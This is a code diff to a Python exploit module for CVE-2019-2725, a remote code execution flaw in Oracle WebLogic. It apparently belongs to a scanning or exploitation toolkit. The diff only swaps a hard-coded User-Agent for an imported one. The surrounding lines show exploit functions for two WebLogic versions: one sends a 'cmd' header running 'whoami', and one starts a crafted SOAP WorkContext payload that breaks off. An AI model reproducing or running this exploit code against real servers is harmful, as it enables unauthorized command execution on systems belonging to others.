@@ -11,13 +11,14 @@
 import sys
 import requests
 
+from config.config_requests import ua
 
 VUL=['CVE-2019-2725']
 
 def weblogic_10_3_6(ip):
     headers = {
     "Accept-Language":"zh-CN,zh;q=0.9,en;q=0.8",
-    "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
+    "User-Agent":ua,
     "Content-Type":"text/xml",
     "cmd":"%s"%("whoami")
     }
@@ -40,7 +41,7 @@ def weblogic_10_3_6(ip):
 def weblogic_12_1_3(ip):
     headers = {
     "Accept-Language":"zh-CN,zh;q=0.9,en;q=0.8",
-    "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
+    "User-Agent":ua,
     "Content-Type":"text/xml"
 }
     body='''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService"> <soapenv:Header> <wsa:Action>xx</wsa:Action><wsa:RelatesTo>xx</wsa:RelatesTo> <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"> 
